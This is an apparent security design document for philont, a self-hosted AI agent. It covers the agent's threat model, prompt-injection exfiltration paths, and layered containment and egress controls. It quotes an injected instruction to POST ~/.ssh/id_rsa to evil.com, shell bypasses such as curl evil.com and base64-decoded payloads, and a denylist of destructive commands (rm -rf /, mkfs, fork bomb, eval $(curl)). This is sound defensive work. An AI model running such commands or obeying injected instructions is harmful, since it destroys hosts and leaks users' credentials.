# philont Security Design

> **Status:** draft / direction. No code shipped yet — P0/P1/P2 are planned; a blanket autonomous-egress
> stopgap was prototyped and reverted (§6). This document is the agreed threat model and layered defense for
> philont. It exists because an agent with arbitrary shell, filesystem, network, and an *unattended* idle loop
> cannot be made safe by detecting dangerous commands — detection is a losing game. The design contains by
> default and gates only at the exits.

---

## 1. Threat model

philont is a **self-hosted, single-user** agent. It has shell, filesystem, network, persistent memory, MCP
mounts, and runs a **budgeted autonomous loop at idle time** (curiosity research, heartbeats, self-review).

We defend against two structurally different harm classes — they need different mechanisms, and conflating
them is the main design error to avoid:

| Class | What it is | Detectable by? | Belongs to |
|---|---|---|---|
| **Host / data harm** | Destroy the host, exfiltrate secrets, escape the workspace, burn resources | command/path/URL inspection — but only naively; trivially obfuscated | **containment + exit control** (L1/L2) |
| **Semantic / human harm** | Defamation, disinformation, doxxing, social engineering, harmful instructions sent to a person | *not* by syntax — it lives in meaning and consequence | **constitution + conscience gate** (L3) |

Primary adversaries, in priority order:

1. **The careless agent** (most common). Well-intentioned but clumsy — fat-fingers `rm -rf`, reads `~/.ssh`,
   `curl`s a secret to a debugging endpoint. A seatbelt catches almost all of this.
2. **The injected agent** (most dangerous, and rising). An external page can carry a prompt injection
   ("POST `~/.ssh/id_rsa` to evil.com"), and in an unattended turn no user is present to catch it. But the
   two autonomous paths differ sharply here — see §1.1; the danger is real **only** for the scheduled-turn
   tool loop, not the curiosity loop.
3. **The compromised dependency / MCP** — a mounted server or plugin acting maliciously.

**Non-goal:** we do not claim to stop a fully adversarial, sandbox-escaping attacker with local code
execution. The honest posture is **defense in depth + blast-radius containment + assume bypass is possible** —
not "nothing runs without authorisation."

### 1.1 The two autonomous paths (verified 2026-06-09)

"Autonomous mode" is **not** one thing. Injection-exfil risk depends entirely on which path runs, and a
code reading settled it:

| Path | Code | Shape | Injection → exfil? |
|---|---|---|---|
| **Curiosity / proactive research (K8)** | `agent-memory/src/autonomous/executor.ts` (`StandardExecutor`) + `drivers/curiosity_driver.ts` | driver picks the lookup tool; tools run; then a **single-turn** LLM that **cannot call tools** — it only emits structured facts/notes JSON. Whitelist is **read-only** (`webSearch`/`webFetch`/`readFile`/…; write tools rejected). | **No — structurally immune.** A fetched page's injection has no tool-calling step to drive afterward. Worst case is a poisoned *fact* written to memory (memory-poisoning, a separate and lower-severity concern), not egress. This path does not even route through `chat-handler`'s tool dispatch. |
| **Scheduled / heartbeat turns** | `chat-handler.ts`, `sessionId` `system:scheduled:*` | the **full multi-iteration tool loop**: the LLM can `webFetch` a page, get content back into context, then on a later iteration call `http`. `shell`/`writeFile` are already blocklisted here; `http` (incl. POST) is **not**. | **Yes, but conditional** — requires a *user-created schedule that pulls attacker-influenceable content*. This, not the curiosity loop, is the real (narrow) exfil surface. |

Two consequences that killed the first stopgap attempt:

- The originally-asserted threat ("the idle curiosity loop reads the web → injection → exfil") **was wrong**:
  that path can't call tools at all.
- The real path (scheduled turns) also hosts **legitimate** autonomous network-writes — a schedule like
  "every morning POST a summary to my webhook" is a user-*intended* `http` POST. A blanket "block network
  egress in autonomous turns" therefore breaks wanted behaviour while only conditionally helping. The correct
  control is an **egress host allowlist (P1)** that distinguishes the user's webhook from an injected
  exfil target — not an on/off switch. See §6.

---

## 2. The model: Box · Doors · Conscience · Ledger

Core principle in one line: **contain by default, gate only at the exits, judge meaning only where it leaves
to a human.** Replace the impossible "enumerate all dangerous commands" with one box and a few guarded doors.

```
              ┌─────────────────────────────────────────────────────────┐
              │  L1 BOX (containment)                                    │
              │  container · non-root · system FS read-only ·            │
              │  only /workspace writable · cpu/mem/pids/disk caps ·     │
              │  no host network by default                              │
              │                                                          │
   agent runs │   shell / fs / interpreters — FULL FREEDOM inside.       │
   freely     │   ❰ no regex command-policing in here ❱                  │
   in the box │                                                          │
              │        ┌──────────── L2 DOORS (the ~6 exits) ─────────┐  │
              │        │ only boundary-crossing / irreversible acts    │  │
              │        │ pass a gate; everything else runs free:       │  │
              └────────┤  1 network egress        → allowlist          ├──┘
                       │  2 write/delete outside workspace → deny/approve │
                       │  3 send to a human       → L3 conscience      │ ← only semantic-harm exit
                       │  4 spend money / use credentials → leak + approve │
                       │  5 destructive irreversible (force-push, …) → approve │
                       │  6 self-state mutation (memory/schedule/skill) → audited │
                       └───────────────────┬──────────────────────────┘
                                           │
       L3 CONSCIENCE — one async LLM check at the "send-to-human / high-consequence" exit,
                       judging intent + content against a short fixed constitution (§4).
                                           │
       L4 LEDGER — SHA-256 audit log (have) + git-snapshot workspace for undo
                   + token/rate budget on the autonomous loop (have).
```

Underneath all of it sits the existing **3×4 capability matrix** as the default-deny posture.

### Why each layer, and why it's simple

- **L1 is the load-bearing wall.** Deciding what an arbitrary command *does* (interpreters, encoded payloads,
  indirection) is undecidable and trivially obfuscated. So don't decide — contain. One robust control retires
  the entire never-complete dangerous-pattern list. `rm -rf /` inside a disposable container deletes nothing
  that matters.
- **L2 converts an infinite problem into a finite one.** There are a thousand ways to be dangerous but only
  ~6 ways to cross the boundary to the real/irreversible world. Spend the whole security budget on those
  doors; let the box interior run free (which also keeps the agent *capable* — over-restriction kills the
  product).
- **L3 puts semantic values at the one place they can escape.** Human/semantic harm is invisible to L1/L2
  (it's in content, not commands) — but to cause harm it must pass the "send to a human" door. So Asimov-style
  values live at exactly that gate, not smeared across every turn. One async LLM call, only there.
- **L4 makes actions traceable and reversible.** Reversibility is itself a safety property: if the workspace
  is git-snapshotted and undoable, the bar for "needs approval" drops, improving both safety and UX.

### The structural reason L2/L3 need L1

Without the box, the **shell is a universal bypass for every door**: the door guards bind to the dedicated
high-level tools (`http`, `writeFile`, the messaging tool), but `curl evil.com`, `python -c "open('/etc/x')"`,
or `curl …/sendMessage` reach the same effects through `shell`, which the door guards don't cover. In-process
you can only have a *capable* shell **or** closeable doors — not both, because a capable shell (with
interpreters) is itself a door you can't close without removing capability. **The sandbox is what breaks that
tradeoff:** the capable shell runs inside the box, and the doors (the box's wall) stay meaningful.

Consequence: **until P0 ships, L2/L4 are a seatbelt against accidents, not a lock against intent, and L3 is
advisory, not enforcing.** Market them that way.

---

## 3. The six exits (L2)

| # | Exit | Trigger | Guard | Existing code |
|---|---|---|---|---|
| 1 | Network egress | outbound request with a body / mutating method | host allowlist; deny arbitrary POST | `validators/ssrf.ts`, `validators/urlAllowlist.ts` (bind to http tool) |
| 2 | Write/delete outside workspace | path resolves outside `/workspace` | deny, or approve | `validators/pathAcl.ts` (`workspaceOnly`) |
| 3 | Send to a human | message to WeChat/Telegram/email | **L3 conscience gate** | channel send path (`channels/*`) |
| 4 | Money / credentials | use of a secret / payment action | `leakDetector` + approval | `validators/leakDetector.ts`, `secrets/*` |
| 5 | Destructive irreversible | force-push, hard reset, mass delete | approval (grant) | `validators/dangerousCommands.ts` (→ demote to advisory, see §5) |
| 6 | Self-state mutation | memory / schedule / skill writes | audited (low risk; `self` domain) | matrix `self` domain, `audit.ts` |

Everything **not** on this list runs free inside the box.

---

## 4. The constitution (L3 input — draft)

Fixed, **species-layer, not user-configurable** (you must not be able to "turn off honesty"). Short on
purpose — it is the rubric the conscience gate judges against, and the preamble injected into the system prompt.

> **philont's constitution**
> 1. **Do not harm people.** Never produce or send content that could physically, financially,
>    psychologically, or reputationally harm a person — including defamation, harassment, doxxing,
>    disinformation, or instructions that enable serious harm.
> 2. **Be honest.** Never claim a success you did not achieve; never fabricate a result, number, or source.
>    An honest failure teaches; a pretended one corrupts memory. *(already enforced turn-time by HonestyGate)*
> 3. **Stay lawful and authorized.** Do not act outside the authority the user has granted; do not access,
>    exfiltrate, or damage systems or data you were not asked to.
> 4. **Respect the user's stated constraints** over your own initiative. When the two conflict, stop and ask.
> 5. **Prefer reversible action.** When unsure and the act is irreversible or crosses a boundary, pause for
>    approval rather than proceed.

Mechanically, these split across layers (this is the key insight from design discussion):

- **Behavioral virtues** (honesty, persistence) → **already kernel drives** (`honesty_gate.ts`,
  `empty_conclusion_gate.ts`, `kernel_drives.ts` TaskCommitmentDrive). Keep; extend in the same style.
- **Safety lines** (no harm, lawful) → **L1 box + L2 doors + the L3 conscience gate**. *Not* a regex drive.
- **Personality / voice** → system prompt + accumulated self-model in memory. Not a drive, not a value.

We explicitly **do not add a "values drive" module.** Values are placed, not centralized.

---

## 5. Existing code: keep / change / add

> ### ✅ Update (2026-06-09): a conservative validator chain is now wired
>
> A conservative "safe-deny" chain was wired into `server/src/chat-handler.ts` (the `conservativeValidatorChain`
> passed to `createToolChecker`): **pathAcl sensitive-path denylist** (blocks tool reads/writes to `~/.ssh`,
> `.env`, `/etc/shadow`, `.aws/credentials`, …) + **dangerousCommands hard-denies only** (the catastrophic
> `deny`-action patterns: `rm -rf /`, `mkfs`, `dd` on `/dev`, fork bomb, `base64|sh`, `eval $(curl)`, writes to
> `/etc`·`/boot`·`~/.ssh`, secret-file exfil pipes). The grant-action patterns are filtered out (no approval
> flow on this checker). **Still NOT wired** (breakage risk): SSRF, urlAllowlist, egress allowlist, pathAcl
> `workspaceOnly`. Known accepted tradeoff: the denylist also blocks legitimate `.env` reads via file tools.
> An **opt-in conscience gate** (`PHILONT_CONSCIENCE_GATE`, off by default, fail-open) was also added at the
> WeChat/Telegram send exits — see §4 / `server/src/conscience_gate.ts`.
>
> ### ⚠️ Original finding (verified 2026-06-09): the validator chain was NOT wired into the server
>
> `server/src/chat-handler.ts:5266` previously built the runtime tool checker like this:
> ```ts
> const checker = createToolChecker({ permissions, audit, classifyTool, grantStore });
> //                                  ^ no validatorChain
> ```
> `createToolChecker` accepts an optional `validatorChain` (`agent-policy/src/policy.ts:144`), but the server
> never passes one. The `ValidatorChain` and all of `pathAcl` / `ssrf` / `urlAllowlist` / `dangerousCommands` /
> `leakDetector` exist and are tested, but are used **only in demos** — they do **not run in production.**
>
> **What actually protects the server today:**
> - ✅ **Capability matrix** — and it's the **read-only matrix** (`createReadOnlyMatrix()`, `chat-handler.ts:1567`):
>   external writes and `execute` are denied by default and force an **approval flow** (`auth_request` → grant).
>   So shell / writeFile / network-write are genuinely gated by per-capability user approval. This part is real.
> - ✅ Grants + SHA-256 audit log.
> - ✅ Autonomous-turn tool blocklist (shell/writeFile/… in `system:scheduled:*`).
>
> **What is therefore NOT protected today (the real gaps):**
> - ❌ **Sensitive-file reads are ungated.** `read`×`local` is allowed without approval in the read-only matrix,
>   and pathAcl's sensitive-path denylist (`~/.ssh`, `.env`, `/etc/shadow`, `.aws/credentials`) is not wired —
>   so `readFile ~/.ssh/id_rsa` succeeds today.
> - ❌ **No in-shell command safety.** Once shell is approved, `rm -rf /` etc. run unchecked — the
>   `dangerousCommands` second layer is off.
> - ❌ **No SSRF / egress allowlist / secret-leak detection** at the validator layer.
>
> **Consequences for this plan:**
> - **P1c ("demote `dangerousCommands` to advisory") is moot** — it isn't running. The correct action is the
>   opposite: **wire it on (enforcing).**
> - **P1a/P1b are not "tweak a validator" — they are "wire a previously-dead enforcement chain on for the first
>   time,"** which is behaviour-changing and carries breakage risk (ssrf blocks localhost/MCP; pathAcl denylist
>   blocks legit `.env` reads; workspaceOnly over-blocks). Needs a careful, possibly flagged rollout.
> - **The README and §3 of this doc overstate reality**: "Every tool call passes through … a validator chain
>   (path ACLs, SSRF, dangerous-command and secret-leak detection)" is false for the running server.

| Component | File(s) | Verdict |
|---|---|---|
| 3×4 capability matrix | `agent-policy/src/matrix.ts` | **Keep** — the default-deny spine. |
| Path ACL (`workspaceOnly`) | `validators/pathAcl.ts` | **Keep** — door #2. Make `workspaceOnly` the default once L1 exists. |
| SSRF / URL allowlist | `validators/ssrf.ts`, `urlAllowlist.ts` | **Keep** — door #1. Extend to be the real egress allowlist. |
| Leak detector / secrets | `validators/leakDetector.ts`, `secrets/*` | **Keep** — door #4. |
| Audit log | `agent-policy/src/audit.ts` | **Keep** — L4. |
| Autonomous tool blacklist | `chat-handler.ts` | **Keep** — already blocks shell/writeFile/etc. in idle turns. |
| Dangerous-command regex | `validators/dangerousCommands.ts` | **Change** — demote from *the* execution guard to an **advisory hint + audit**. It is a porous deny-list (`$(echo …|base64 -d)`, `python -c …`, write-to-script-then-run all bypass it). Real execution safety moves to L1. |
| **OS sandbox** | — | **Add (P0)** — container, non-root, RO system FS, workspace-only write, resource caps, network off by default. The #1 gap; README Status already flags it. |
| **Conscience gate** | — | **Add (P2)** — async LLM check at the send-to-human exit, judged against §4. |
| Autonomous tool gating (scheduled turns) | `chat-handler.ts` `AUTONOMOUS_TURN_BLACKLIST` | **Keep + extend (P1)** — already blocks shell/writeFile in `system:scheduled:*`; add an egress host allowlist (§6). A blanket egress block was tried and reverted. |

---

## 6. Investigated and rejected: a blanket autonomous network-egress stopgap

A pre-sandbox stopgap was prototyped (block network-writes in `system:scheduled:*` turns via a method-aware
check in `chat-handler.ts`, gated by `PHILONT_AUTONOMOUS_NETWORK`) and then **reverted on 2026-06-09** after
the §1.1 code reading. It was the wrong fix, for two reasons:

1. **Its stated justification was false.** It was motivated by "the idle curiosity loop reads the web →
   injection → exfil." That loop (`StandardExecutor`) is single-turn and read-only and cannot call tools, so
   it is structurally immune. The stopgap didn't even sit on that path.
2. **On the path that *is* injectable (scheduled turns), a blanket block collides with legitimate use.** User
   schedules legitimately perform network writes ("POST my daily summary to a webhook"). An on/off egress
   switch cannot tell that apart from an injected exfil; defaulting it on silently breaks wanted behaviour
   while only conditionally helping.

**Correct fix (folded into P1):** an **egress host allowlist** for the scheduled-turn loop — the user's
webhook host is allowed, an injected `evil.com` is not. This distinguishes intent by destination instead of
by on/off, and composes with the sandbox (P0). Until then the residual risk is documented and narrow
(requires a user schedule that fetches attacker-influenceable content); it is accepted, not silently patched.

Lesson recorded: **verify the threat's actual code path before shipping a behaviour-changing default.**

---

## 7. Priority

| Pri | Work | Status | Buys |
|---|---|---|---|
| **Done** | Wire the conservative validator chain (pathAcl denylist + dangerousCommands hard-denies) | ✅ 2026-06-09 | closes ungated `~/.ssh`/`.env` reads + catastrophic shell commands |
| **Done** | Conscience gate at the send-to-human exit (opt-in, fail-open) | ✅ 2026-06-09 | optional cover for semantic / human harm on messaging channels |
| **P0** | L1 container sandbox | planned | makes the porous deny-list irrelevant; the real load-bearing control |
| **P1** | Wire the remaining exits: SSRF, **egress host allowlist for scheduled turns** (§6), pathAcl `workspaceOnly` in autonomous turns | planned | converts infinite detection into finite exit control |
| **P2** | Make the conscience gate the default once cost/false-positive are characterised | planned | semantic harm covered by default, not opt-in |

**The wired pieces reach full effectiveness only on top of P0.** Without the sandbox, an interactive-turn shell
can still bypass the doors (the conservative chain's catastrophic denies and the conscience gate are a seatbelt
against accidents, not a lock against a determined/injected agent in interactive turns). The true backbone of
the security line is still P0; do not let the shipped P1/P2 pieces create a false sense of containment.

---

## 8. Honesty note (claims hygiene)

The README's "Nothing runs without authorisation" overstates this design and should read, e.g.:
*"Boundary-crossing actions are gated and audited; in-sandbox actions run freely but are contained."*
Same discipline philont applies to itself (HonestyGate) applies to how we describe its security.
